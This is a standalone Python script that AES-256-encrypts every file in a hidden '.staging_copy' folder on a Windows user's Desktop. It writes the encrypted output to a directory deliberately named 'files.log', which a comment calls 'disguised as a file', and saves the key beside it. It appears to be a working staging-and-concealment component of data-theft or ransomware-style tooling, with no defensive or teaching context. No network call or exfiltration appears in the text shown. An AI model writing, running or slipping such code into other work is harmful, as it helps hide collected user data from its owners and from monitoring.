import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import shutil

# === CONFIGURATION ===
SOURCE_FOLDER = os.path.join(os.environ['USERPROFILE'], 'Desktop', '.staging_copy')
ENCRYPTED_OUTPUT = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'files.log')  # disguised as a file
KEY_FILE = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'key.bin')

def generate_key():
    key = get_random_bytes(32)  # AES-256
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    print(f"[+] AES key saved to: {KEY_FILE}")
    return key

def encrypt_file(file_path, key, output_dir):
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    # Build encrypted file path
    rel_path = os.path.relpath(file_path, SOURCE_FOLDER)
    encrypted_path = os.path.join(output_dir, rel_path)

    os.makedirs(os.path.dirname(encrypted_path), exist_ok=True)
    with open(encrypted_path, 'wb') as f:
        f.write(iv + ciphertext)

    print(f"[+] Encrypted: {file_path} -> {encrypted_path}")

def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root, file)
            encrypt_file(full_path, key, ENCRYPTED_OUTPUT)

if __name__ == '__main__':
    if not os.path.exists(SOURCE_FOLDER):
        print(f"[!] Source folder '{SOURCE_FOLDER}' does not exist. Aborting.")
        exit(1)

    # Clean up previous encrypted output
    if os.path.exists(ENCRYPTED_OUTPUT):
        shutil.rmtree(ENCRYPTED_OUTPUT)

    os.makedirs(ENCRYPTED_OUTPUT, exist_ok=True)

    key = generate_key()
    encrypt_folder(SOURCE_FOLDER, key)
    print(f"[+] Folder encrypted and renamed to: {ENCRYPTED_OUTPUT}")
